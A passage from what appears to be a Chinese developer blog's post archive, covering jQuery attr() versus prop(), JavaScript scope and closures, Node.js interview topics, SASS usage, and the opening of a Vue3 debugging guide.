class="params"></span>) </span>&#123;</span><br><span class="line">            alert($(<span class="keyword">this</span>).prop(<span class="string">'checked'</span>));</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line">&lt;<span class="regexp">/script&gt;  /</span><span class="regexp">/返回true，false</span></span><br></pre></td></tr></table></figure>
<h1 id="2-网上的总结-链接"><a href="#2-网上的总结-链接" class="headerlink" title="2.网上的总结  链接"></a>2.网上的总结  <a href="http://blog.csdn.net/qq_35809245/article/details/54389797" target="_blank" rel="noopener">链接</a></h1><h2 id="2-1-属性的定义"><a href="#2-1-属性的定义" class="headerlink" title="2.1 属性的定义:"></a>2.1 属性的定义:</h2><p>根据W3C手册所述：属性包括，标准属性：id class style title 语言属性 lang dir以及某些特定的元素的固有的属性，比如 a 的 href target 属性，input元素的 radio checked type alt src disabled value 等 ，img标签的width height src alt 等，不存在的属性叫做新增属性。 </p>
<h2 id="2-2-attr"><a href="#2-2-attr" class="headerlink" title="2.2 attr():"></a>2.2 attr():</h2><p>可以设置元素的属性（也就是给元素新增加一个原来并不存在的属性）也可以获取元素的本来就有的属性以及额外设置的属性。如果要获取的属性没有设置，那么获取到的结果是 undefined; </p>
<h2 id="2-3-prop-："><a href="#2-3-prop-：" class="headerlink" title="2.3 prop()："></a>2.3 prop()：</h2><p>可以设置元素的属性（HTML固有的属性，可以给元素添加属性）也可以获取元素的固有的属性值，如果是额外设置的其他属性，则无法通过prop（ ）获取。 </p>
<h2 id="2-4-设置元素属性："><a href="#2-4-设置元素属性：" class="headerlink" title="2.4 设置元素属性："></a>2.4 设置元素属性：</h2><p>attr （“属性名”，“属性值”） 既可以设置元素固有的属性，也可以设置元素本来不存在的属性，比如attr（）可以给下面代码div行设置固有的HTML属性，包括 ttle id class 等，也可以设置原先不存在的属性，也就是造一个新的属性，比如 index aaa 等，任何都行；而 prop( “属性名”，“属性值”)只能设置固有的HTML属性。<br>获取元素属性值：<br>attr(“属性值“）只能获取已经设置在元素身体上的属性值，包括固有属性和新增属性，没有设置的属性将无法获取到值，结果全部是undefined; </p>
<h1 id="3-举例"><a href="#3-举例" class="headerlink" title="3.举例"></a>3.举例</h1><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;div <span class="class"><span class="keyword">class</span></span>=<span class="string">"cls1 cls2"</span> id=<span class="string">"dv"</span> title=<span class="string">"我是一个div"</span>&gt;<span class="xml"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">&lt;script type=<span class="string">"text/javascript"</span>&gt;</span><br><span class="line">	$(<span class="string">"#dv"</span>).attr(<span class="string">"index"</span>,<span class="string">"1"</span>)</span><br><span class="line">	<span class="built_in">console</span>.log($(<span class="string">"#dv"</span>).prop(<span class="string">"index"</span>));</span><br><span class="line">	<span class="built_in">console</span>.log($(<span class="string">"#dv"</span>).attr(<span class="string">"index"</span>));</span><br><span class="line">&lt;<span class="regexp">/script&gt;  /</span><span class="regexp">/输出结果是:undefined  1</span></span><br></pre></td></tr></table></figure>
<p>说明prop不能获取到非固有属性</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;input type=<span class="string">"checkbox"</span> value=<span class="string">"复选框"</span> id=<span class="string">"chk"</span>/&gt;这是一个复选框</span><br><span class="line">&lt;script type=<span class="string">"text/javascript"</span>&gt;</span><br><span class="line">	<span class="built_in">console</span>.log($(<span class="string">"#chk"</span>).prop(<span class="string">"value"</span>));</span><br><span class="line">    <span class="built_in">console</span>.log($(<span class="string">"#chk"</span>).attr(<span class="string">"value"</span>));</span><br><span class="line">    <span class="built_in">console</span>.log($(<span class="string">"#chk"</span>).prop(<span class="string">"checked"</span>));</span><br><span class="line">    <span class="built_in">console</span>.log($(<span class="string">"#chk"</span>).attr(<span class="string">"checked"</span>));</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br><span class="line"><span class="regexp">/</span>*</span><br><span class="line">第一次点击输出:复选框 复选框 <span class="literal">true</span> <span class="literal">undefined</span></span><br><span class="line">第二次点击输出:复选框 复选框 <span class="literal">false</span> <span class="literal">undefined</span></span><br><span class="line">*<span class="regexp">/</span></span><br></pre></td></tr></table></figure>
<p>说明attr不能获取到没有定义的属性</p>
<h1 id="4-用法"><a href="#4-用法" class="headerlink" title="4.用法"></a>4.用法</h1><p>1.如果想要通过attr()获取元素的属性值，那么该属性必须显式的设置在HTML代码中或者通过attr新增的属性才能被获取到，如果没有设置，那么将返回undefined<br>2 如果通过prop（）获取属性值，那么该属性只能是HTMl的固有属性，无论是否显式的设置，都可以获取其对应的属性值，如果是额外增加的属性，那么将无法获取。<br>对于HTML元素本身就带有的固有属性，在处理时，使用prop方法。<br>对于HTML元素我们自己自定义的DOM属性，在处理时，使用attr方法。<br>具有 true 和 false 两个属性的属性，如 checked, selected 或者 disabled 使用prop()</p>
]]></content>
      <categories>
        <category>Javascript</category>
      </categories>
      <tags>
        <tag>jquery</tag>
        <tag>属性获取</tag>
      </tags>
  </entry>
  <entry>
    <title>Js中作用域和闭包</title>
    <url>/2018/02/25/Js%E4%B8%AD%E7%9A%84%E4%BD%9C%E7%94%A8%E5%9F%9F%E5%92%8C%E9%97%AD%E5%8C%85/</url>
    <content><![CDATA[<p>&nbsp;&nbsp;&nbsp;&nbsp;最近看了一些前端的面试题，发现自己的基础不是很扎实。这两天恶补了关于js中作用域和闭包的知识。下面分享几个例子。</p>
<p></p><h2 style="color:#6795B5;">1.局部变量和全局变量</h2><br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script type=<span class="string">"text/javascript"</span>&gt;</span><br><span class="line">	<span class="keyword">var</span> num=<span class="number">10</span>;</span><br><span class="line">		<span class="function"><span class="keyword">function</span> <span class="title">get</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">			alert(num);</span><br><span class="line">		&#125;</span><br><span class="line">		get();<span class="comment">//答案是:10</span></span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure><p></p>
<a id="more"></a>
<p>这里在最外层var num=10相当于定义了一个全局变量，都可以访问。相反在函数内部使用var定义的变量，外部访问时就会报错。<br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script type=<span class="string">"text/javascript"</span>&gt;</span><br><span class="line">	<span class="keyword">var</span> num=<span class="number">10</span>;</span><br><span class="line">		<span class="function"><span class="keyword">function</span> <span class="title">get</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">			alert(num);</span><br><span class="line">			<span class="keyword">var</span> num =<span class="number">20</span>;</span><br><span class="line">			alert(num);</span><br><span class="line">		&#125;</span><br><span class="line">		get();<span class="comment">//答案是:undefined  20</span></span><br><span class="line">	<span class="keyword">var</span> num=<span class="number">10</span>;</span><br><span class="line">		<span class="function"><span class="keyword">function</span> <span class="title">get</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">			alert(num);</span><br><span class="line">			num =<span class="number">20</span>;</span><br><span class="line">			alert(num);</span><br><span class="line">		&#125;</span><br><span class="line">		get();<span class="comment">//答案是:10 20</span></span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>在js中函数内部申明变量会先进行预编译，所以第一个里并没有访问到外部的变量，而是返回undefined(注意不是报错)。第二个中并没有申明而是直接重新赋值。<br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script type=<span class="string">"text/javascript"</span>&gt;</span><br><span class="line">	<span class="keyword">var</span> func=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">			alert(<span class="string">'调用外部函数'</span>);</span><br><span class="line">		&#125;;</span><br><span class="line">	<span class="keyword">var</span> foo=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		func();</span><br><span class="line">		<span class="keyword">var</span> func=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		alert(<span class="string">'调用内部函数'</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		func();</span><br><span class="line">		&#125;;</span><br><span class="line">		foo();<span class="comment">//答案会报错</span></span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>在js中匿名函数不会预编译 其他的与上面同理</p>
<p></p><h2 style="color:#6795B5;">2.闭包</h2><br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script type=<span class="string">"text/javascript"</span>&gt;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">getnumber</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">			<span class="keyword">var</span> number=<span class="number">10</span>;</span><br><span class="line">			<span class="keyword">var</span> show=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">				number++;</span><br><span class="line">				alert(number);</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">return</span> show;</span><br><span class="line">		&#125;</span><br><span class="line">	<span class="keyword">var</span> shonumber=getnumber();</span><br><span class="line">	<span class="keyword">var</span> shonumber1=getnumber();</span><br><span class="line">	shonumber();</span><br><span class="line">	shonumber();</span><br><span class="line">	shonumber1();<span class="comment">//答案是:11 12 11</span></span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure><p></p>
<p>这是一个经典的闭包。我们先看一看闭包的作用：（1）可以获取本函数外部的变量（2）这些变量一直保存在内存中，页面关闭释放<br>因此number变量保存在内存中，所以为 11 12 11<br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script type=<span class="string">"text/javascript"</span>&gt;</span><br><span class="line">	<span class="keyword">var</span> name = <span class="string">"outer"</span>;</span><br><span class="line">　　<span class="keyword">var</span> object = &#123;</span><br><span class="line">　　　　name : <span class="string">"inner"</span>,</span><br><span class="line">　　　　agetNameFunc : <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">　　　　　　<span class="keyword">return</span> <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">　　　　　　　　<span class="keyword">return</span> <span class="keyword">this</span>.name;</span><br><span class="line">　　　　　　&#125;;</span><br><span class="line">　　　　&#125;</span><br><span class="line">　　&#125;;</span><br><span class="line">　　alert(object.getNameFunc()());<span class="comment">//答案是:outer</span></span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>this对象是在运行时基于函数的执行环境绑定的：在全局函数中，this等于window，而当函数被作为某个对象调用时，this等于那个对象。不过，匿名函数具有全局性，因此this对象同常指向window</p>
]]></content>
      <categories>
        <category>Javascript</category>
      </categories>
      <tags>
        <tag>JS</tag>
        <tag>作用域</tag>
        <tag>闭包</tag>
      </tags>
  </entry>
  <entry>
    <title>Node的一些问题</title>
    <url>/2019/03/28/Node%E7%9A%84%E4%B8%80%E4%BA%9B%E9%97%AE%E9%A2%98/</url>
    <content><![CDATA[<p>&nbsp;&nbsp;&nbsp;&nbsp;最近的几次面试都问到了关于node的一些问题。一个是nodeJS的使用场景有哪些，它的优势有哪些呀。还有一个是node与java等其他后端语言的区别。还有就是node的事件机制与浏览器的事件机制有什么区别。<br><a id="more"></a></p>
<h2 id="1-node的使用场景"><a href="#1-node的使用场景" class="headerlink" title="1.node的使用场景"></a>1.node的使用场景</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;首先看一下node的特点吧。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1. 它是一个Javascript运行环境</span><br><span class="line">2. 依赖于Chrome V8引擎进行代码解释</span><br><span class="line">3. 事件驱动</span><br><span class="line">4. 非阻塞I/O</span><br><span class="line">5. 轻量、可伸缩，适于实时数据交互应用</span><br><span class="line">6. 单进程，单线程</span><br></pre></td></tr></table></figure></p>
<p>优点：<br>　　1. 高并发（最重要的优点）<br>　　2. 适合I/O密集型应用<br>缺点：<br>　　1. 不适合CPU密集型应用；CPU密集型应用给Node带来的挑战主要是：由于JavaScript单线程的原因，如果有长时间运行的计算（比如大循环），将会导致CPU时间片不能释放，使得后续I/O无法发起；<br>　　　　解决方案：分解大型运算任务为多个小任务，使得运算能够适时释放，不阻塞I/O调用的发起；<br>　　2. 只支持单核CPU，不能充分利用CPU<br>　　3. 可靠性低，一旦代码某个环节崩溃，整个系统都崩溃<br>　　　　原因：单进程，单线程<br>　　　　解决方案：（1）Nnigx反向代理，负载均衡，开多个进程，绑定多个端口；<br>　　　　　　　　　（2）开多个进程监听同一个端口，使用cluster模块；<br>　　4. 开源组件库质量参差不齐，更新快，向下不兼容<br>　　5. Debug不方便，错误没有stack trace<br>所以适用场景大概就是满足这些特点的：在高并发、I/O密集、少量业务逻辑的场景</p>
<h2 id="2-node与java的对比"><a href="#2-node与java的对比" class="headerlink" title="2.node与java的对比"></a>2.node与java的对比</h2><p>首先就是node是单线程而java是多线程的<br>（1）node.js比Java更快 ：node.js开发快，运行的效率也算比较高，但是如果项目大了就容易乱，而且javascript不是静态类型的语言，<br>要到运行时才知道类型错误，所以写的多了之后免不了会出现光知道有错但是找不到哪儿错的情况，所以测试就得些的更好更详细。<br>     java开发慢，但是如果项目大、复杂的话，用java就不容易乱，管理起来比node.js省。</p>
<p>（2）Node.js 前后端都采用Javascript，代表未来发展的趋势，而java则是现在的最流行的服务器端编程语言。<br>（3）Node.js和Java EE——一种是解释语言，一种是编译语言.</p>
<h2 id="3-node的事件机制"><a href="#3-node的事件机制" class="headerlink" title="3.node的事件机制"></a>3.node的事件机制</h2><p>Node 10以前：<br>执行完一个阶段的所有任务<br>执行完nextTick队列里面的内容<br>然后执行完微任务队列的内容</p>
<p>Node 11以后： 和浏览器的行为统一了，都是每执行一个宏任务就执行完微任务队列。</p>
]]></content>
      <categories>
        <category>NodeJs</category>
      </categories>
      <tags>
        <tag>NodeJs</tag>
      </tags>
  </entry>
  <entry>
    <title>SASS的使用</title>
    <url>/2019/05/24/SASS%E7%9A%84%E4%BD%BF%E7%94%A8/</url>
    <content><![CDATA[<p>&nbsp;&nbsp;&nbsp;&nbsp;SASS和LESS都知道并且使用过less，但是在实际的工作中，自己并没有使用到这两种技术。基本上都是纯写的css，但最近自己的css代码被leader看了之后，说写的太冗余了，上面的选择器太长了。建议改成SASS，当时自己心态有点崩，写之前你也没要求这样哇，现在改不是很花时间么，但自己还是要改。最终还是逃不过真香警告，确实改成SASS之后，感觉结构清晰多了，还是挺好用的哈哈。下面就介绍一下自己的使用吧。<br><a id="more"></a></p>
<h2 id="1-单文件的使用"><a href="#1-单文件的使用" class="headerlink" title="1 单文件的使用"></a>1 单文件的使用</h2><p>自己在尝试的过程中，首先把之前的一个静态页面改成了SASS。下面是具体的使用步骤。</p>
<h3 id="1-1-下载"><a href="#1-1-下载" class="headerlink" title="1.1 下载"></a>1.1 下载</h3><p>按照官网的步骤，首先要下载Ruby，直接通过官网下载安装包。安装之后就可以使用gem命令下载SASS和COMPASS<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gem install sass</span><br><span class="line">gem install compass</span><br></pre></td></tr></table></figure></p>
<p>就可以使用sass命令了，下面是一些常用的命令。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">//单文件转换命令</span><br><span class="line">sass input.scss output.css</span><br><span class="line"></span><br><span class="line">//单文件监听命令</span><br><span class="line">sass --watch input.scss:output.css</span><br><span class="line"></span><br><span class="line">//如果你有很多的sass文件的目录，你也可以告诉sass监听整个目录：</span><br><span class="line">sass --watch app/sass:public/stylesheets</span><br></pre></td></tr></table></figure></p>
<ul>
<li>SASS有四种编译排版格式<br>1.nested编译之后会保留之前的嵌套格式,类似这样<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.box &#123;</span><br><span class="line">  width: 300px;</span><br><span class="line">  height: 400px; &#125;</span><br><span class="line">  .box-title &#123;</span><br><span class="line">    height: 30px;</span><br><span class="line">    line-height: 30px; &#125;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p>2.expanded编译之后和正常我们写的css格式类似<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.box &#123;</span><br><span class="line">  width: 300px;</span><br><span class="line">  height: 400px;</span><br><span class="line">&#125;</span><br><span class="line">.box-title &#123;</span><br><span class="line">  height: 30px;</span><br><span class="line">  line-height: 30px;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>3.compact编译之后每一条样式都是横向排列<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.box &#123; width: 300px; height: 400px; &#125;</span><br><span class="line">.box-title &#123; height: 30px; line-height: 30px; &#125;</span><br></pre></td></tr></table></figure></p>
<p>4.compressed通过名字可以知道就是压缩版去掉空格换行</p>
<p>我自己使用的时候不太通过命令行来操作，而是使用可视化工具<br>Koala，可以从官网下载。<a href="https://www.sass.hk/skill/koala-app.html&quot;%3Ehttps://www.sass.hk/skill/koala-app.html" target="_blank" rel="noopener">koala</a><br>下载安装之后就可以直接添加项目，选择生成的路径，使用编译的格式等等。<br><img src="/images/sass1.png" alt="sass"></p>
<h2 id="2-在vue-cli中使用"><a href="#2-在vue-cli中使用" class="headerlink" title="2.在vue-cli中使用"></a>2.在vue-cli中使用</h2><p>其实也很简单，以vue-cli3为例。我们只需要安装相应的loader就可以使用了。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">npm install --save sass-loader</span><br><span class="line">npm install --save node-sass</span><br></pre></td></tr></table></figure></p>
<p>然后在运行项目就可以使用啦！<br><img src="/images/sass2.png" alt="sass"></p>
<h2 id="3-SASS中好用的方法"><a href="#3-SASS中好用的方法" class="headerlink" title="3.SASS中好用的方法"></a>3.SASS中好用的方法</h2><h3 id="3-1-Mixins"><a href="#3-1-Mixins" class="headerlink" title="3.1 Mixins"></a>3.1 Mixins</h3><p>这个方法感觉就是使用一个函数，可以大大的增加代码的复用，还可以传递参数，指定默认值。引用之后同样的可以添加自定义的样式。<br><figure class="highlight scss"><table><tr><td class="code"><pre><span class="line">@<span class="keyword">mixin</span> title-style(<span class="variable">$color</span>, <span class="variable">$background</span>: <span class="number">#eee</span>) &#123;</span><br><span class="line">  <span class="attribute">margin</span>: <span class="number">0</span> <span class="number">0</span> <span class="number">20px</span> <span class="number">0</span>;</span><br><span class="line">  <span class="attribute">font-family</span>: <span class="variable">$font-serif</span>;</span><br><span class="line">  <span class="attribute">font-size</span>: <span class="number">20px</span>;</span><br><span class="line">  <span class="attribute">font-weight</span>: bold;</span><br><span class="line">  <span class="attribute">text-transform</span>: uppercase;</span><br><span class="line">  <span class="attribute">color</span>: <span class="variable">$color</span>;</span><br><span class="line">  <span class="attribute">background</span>: <span class="variable">$background</span>;</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"> <span class="comment">//使用</span></span><br><span class="line"> <span class="selector-tag">section</span><span class="selector-class">.main</span> <span class="selector-tag">h2</span> &#123;</span><br><span class="line">    @<span class="keyword">include</span> title-style(<span class="number">#c63</span>);</span><br><span class="line"> &#125;</span><br><span class="line">  <span class="selector-tag">section</span><span class="selector-class">.main</span> <span class="selector-tag">h2</span> &#123;</span><br><span class="line">    @<span class="keyword">include</span> title-style(<span class="number">#39c</span>, <span class="number">#333</span>);</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure></p>
<h3 id="3-2-extend"><a href="#3-2-extend" class="headerlink" title="3.2@extend"></a>3.2@extend</h3><p>这个方法有一点继承的赶脚，但是不太建议多用，用多了生成的css就跟我自己写的一样了0.0。<br><figure class="highlight scss"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.alert-positive</span> &#123;</span><br><span class="line"> @<span class="keyword">extend</span> .alert;</span><br><span class="line"> <span class="attribute">background</span>: <span class="number">#9c3</span>; </span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//这样就继承了alert类的样式</span></span><br><span class="line"><span class="comment">//编译之后生成的代码</span></span><br><span class="line"></span><br><span class="line"><span class="selector-class">.alert</span>, <span class="selector-class">.alert-positive</span> &#123;</span><br><span class="line">  <span class="attribute">padding</span>: <span class="number">15px</span>;</span><br><span class="line">  <span class="attribute">font-size</span>: <span class="number">1.2em</span>;</span><br><span class="line">  <span class="attribute">font-weight</span>: normal;</span><br><span class="line">  <span class="attribute">text-transform</span>: uppercase;</span><br><span class="line">  <span class="attribute">line-height</span>: <span class="number">1</span>;</span><br><span class="line">  <span class="attribute">letter-spacing</span>: <span class="number">3px</span>;</span><br><span class="line">  <span class="attribute">text-align</span>: center;</span><br><span class="line">  <span class="attribute">color</span>: <span class="number">#fff</span>;</span><br><span class="line">  <span class="attribute">background</span>: <span class="number">#ea4c89</span>;</span><br><span class="line">  -webkit-<span class="attribute">box-shadow</span>: <span class="number">0</span> <span class="number">1px</span> <span class="number">2px</span> rgba(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0.5</span>);</span><br><span class="line">  moz-<span class="attribute">box-shadow</span>: <span class="number">0</span> <span class="number">1px</span> <span class="number">2px</span> rgba(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0.5</span>);</span><br><span class="line">  <span class="attribute">box-shadow</span>: <span class="number">0</span> <span class="number">1px</span> <span class="number">2px</span> rgba(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0.5</span>);</span><br><span class="line">  -webkit-<span class="attribute">border-radius</span>: <span class="number">10px</span>;</span><br><span class="line">  -moz-<span class="attribute">border-radius</span>: <span class="number">10px</span>;</span><br><span class="line">  <span class="attribute">border-radius</span>: <span class="number">10px</span>; </span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.alert-positive</span> &#123; </span><br><span class="line">  <span class="attribute">background</span>: <span class="number">#9c3</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//就会生成两个样式，当继承的元素多了，就会多生成很多重复的选择器</span></span><br></pre></td></tr></table></figure></p>
<h3 id="3-3-嵌套媒体查询"><a href="#3-3-嵌套媒体查询" class="headerlink" title="3.3 嵌套媒体查询"></a>3.3 嵌套媒体查询</h3><ul>
<li>可以直接将媒体查询写到我们希望应用到的元素中，也是很方便了。同样的可以加上变量，混合Mixins，以及循环或者条件语句。<figure class="highlight scss"><table><tr><td class="code"><pre><span class="line"><span class="comment">//定义变量</span></span><br><span class="line"><span class="variable">$width-small</span>: <span class="number">400px</span>; </span><br><span class="line"><span class="variable">$width-medium</span>: <span class="number">760px</span>; </span><br><span class="line"><span class="variable">$width-large</span>: <span class="number">1200px</span>; </span><br><span class="line"><span class="comment">//一个带有参数以及条件语句的mixin</span></span><br><span class="line">@<span class="keyword">mixin</span> responsive(<span class="variable">$width</span>) &#123; </span><br><span class="line">  @<span class="keyword">if</span> <span class="variable">$width</span> == wide-screens &#123; </span><br><span class="line">    @<span class="keyword">media</span> only screen and (max-width: <span class="variable">$width-large</span>) &#123; </span><br><span class="line">      @<span class="keyword">content</span>; </span><br><span class="line">    &#125; </span><br><span class="line">  &#125; </span><br><span class="line">  @<span class="keyword">else</span> if <span class="variable">$width</span> == medium-screens &#123;</span><br><span class="line">     @<span class="keyword">media</span> only screen and (max-width: <span class="variable">$width-medium</span>) &#123;</span><br><span class="line">        @<span class="keyword">content</span>; </span><br><span class="line">      &#125; </span><br><span class="line">    &#125; </span><br><span class="line">  @<span class="keyword">else</span> if <span class="variable">$width</span> == small-screens &#123; </span><br><span class="line">    @<span class="keyword">media</span> only screen and (max-width: <span class="variable">$width-small</span>) &#123;</span><br><span class="line">       @<span class="keyword">content</span>; </span><br><span class="line">      &#125; </span><br><span class="line">    &#125; </span><br><span class="line">  &#125;</span><br><span class="line"><span class="selector-id">#content</span> &#123;</span><br><span class="line">   <span class="attribute">float</span>: left; </span><br><span class="line">   <span class="attribute">width</span>: <span class="number">70%</span>; </span><br><span class="line">   @<span class="keyword">include</span> responsive(wide-screens) &#123;</span><br><span class="line">      <span class="attribute">width</span>: <span class="number">80%</span>;</span><br><span class="line">   &#125; </span><br><span class="line">   @<span class="keyword">include</span> responsive(medium-screens) &#123;</span><br><span class="line">      <span class="attribute">width</span>: <span class="number">50%</span>; </span><br><span class="line">      <span class="attribute">font-size</span>: <span class="number">14px</span>;</span><br><span class="line">   &#125; </span><br><span class="line">   @<span class="keyword">include</span> responsive(small-screens) &#123;</span><br><span class="line">      <span class="attribute">float</span>: none; </span><br><span class="line">      <span class="attribute">width</span>: <span class="number">100%</span>; </span><br><span class="line">      <span class="attribute">font-size</span>: <span class="number">12px</span>;</span><br><span class="line">   &#125; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//编译之后就会生成这样的代码</span></span><br><span class="line"><span class="selector-id">#content</span> &#123;</span><br><span class="line">  <span class="attribute">float</span>: left;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">70%</span>;</span><br><span class="line">&#125;</span><br><span class="line">@<span class="keyword">media</span> only screen and (max-width: 1200px) &#123;</span><br><span class="line">  <span class="selector-id">#content</span> &#123;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">80%</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">@<span class="keyword">media</span> only screen and (max-width: 760px) &#123;</span><br><span class="line">  <span class="selector-id">#content</span> &#123;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">50%</span>;</span><br><span class="line">    <span class="attribute">font-size</span>: <span class="number">14px</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">@<span class="keyword">media</span> only screen and (max-width: 400px) &#123;</span><br><span class="line">  <span class="selector-id">#content</span> &#123;</span><br><span class="line">    <span class="attribute">float</span>: none;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">100%</span>;</span><br><span class="line">    <span class="attribute">font-size</span>: <span class="number">12px</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
</ul>
]]></content>
      <categories>
        <category>css</category>
      </categories>
      <tags>
        <tag>CSS</tag>
      </tags>
  </entry>
  <entry>
    <title>Vue3的调试和测试</title>
    <url>/2020/01/17/Vue3%E7%9A%84%E8%B0%83%E8%AF%95%E5%92%8C%E6%B5%8B%E8%AF%95/</url>
    <content><![CDATA[<p>&nbsp;&nbsp;&nbsp;上一篇中我们简单的介绍了一下Vue3源码的基本目录结构，以及相应的目录对应的功能的实现，和部分新功能在源码中的实现样例。这篇文章主要介绍一下如何使用vue3写一些小demo，将新的特性用起来。除此之外，如何测试源码中的测试样例，并且加入自己的测试：<br><a id="more"></a></p>
<h3 id="如何调试"><a href="#如何调试" class="headerlink" title="如何调试"></a>如何调试</h3><blockquote>
<p>首先拉取vue-next的源码，上一篇文章已经介绍过了，这里就不再赘述了<br>然后修改根目录中的两个文件  tsconfig,json  rollup.config.js方便调试</p>
</blockquote>
<p><img src="/images/Vue31a.png" alt="My Pic"><br><img src="/images/Vue32a.png" alt="My Pic"></p>
<blockquote>
<p>在运行npm run dev</p>
</blockquote>
<p><img src="/images/Vue33a.png" alt="My Pic"></p>
<blockquote>
<p>在项目根目录上新建一个demo文件夹，并在里面创建一个index.html和index.js<br><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- index.html --&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"viewport"</span> <span class="attr">content</span>=<span class="string">"width=device-width, initial-scale=1.0"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"X-UA-Compatible"</span> <span class="attr">content</span>=<span class="string">"ie=edge"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>vue3 demo<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"../packages/vue/dist/vue.global.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- &lt;div id="app"&gt;&lt;/div&gt; --&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"./index.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
</blockquote>
<ul>
